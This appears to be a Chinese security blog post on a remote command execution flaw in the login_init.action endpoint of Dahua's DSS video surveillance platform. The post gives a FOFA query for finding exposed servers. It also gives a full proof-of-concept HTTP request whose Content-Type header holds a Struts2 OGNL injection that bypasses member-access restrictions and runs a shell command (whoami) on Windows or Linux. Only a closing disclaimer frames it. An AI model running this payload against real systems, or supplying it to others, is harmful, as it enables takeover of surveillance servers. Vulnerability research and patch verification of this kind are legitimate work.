#  大华DSS城市安防监控平台login_init.action远程命令执行漏洞   
安全透视镜  网络安全透视镜   2025-01-05 14:00  
  
**一、漏洞描述**  
  
大华DSS数字监控系统是一个在通用安防视频监控系统基础上设计开发的系统。该平台登录接口存在远程命令执行漏洞，攻击者通过在请求头中构造payload实现远程命令执行，可获取服务器管理权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5R2vK7Jm7LO619rRrtI2E4k2Mg58YKoz1pPRku3eID9AkictUgTE29HUKWcgbFyhhU0tzMhlqEBzg/640?wx_fmt=png&from=appmsg "")  
  
**二、fofa搜索**  
  
fofa查询语法  
```
app="dahua-DSS"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5R2vK7Jm7LO619rRrtI2E4TuX38BkREgj7BmyAPEM4A2t06jhfrvjfxx9ia6Ne6Dcd19YwcXLysqw/640?wx_fmt=png&from=appmsg "")  
  
**三、漏洞复现**  
  
POC  
```
POST /portal/login_init.action HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=D4AD1F965A86AA395B5FAA10BFEC6695
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5R2vK7Jm7LO619rRrtI2E4iaQAH0Jp98hzWxu2sXewfB6Cib1BA1oMPibIxjPdnV6lxY2MTiaBnzZb0Q/640?wx_fmt=png&from=appmsg "")  
  
  
# 文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4ibIBPcmgJMLNXWIaCPcW54mVicYJkaOO1JQicEDBGCBM1P7IiaiablZ9tEUrP27FyvB9CZWl5SiaqhicDw/640?wx_fmt=png "")  
  
****  
  
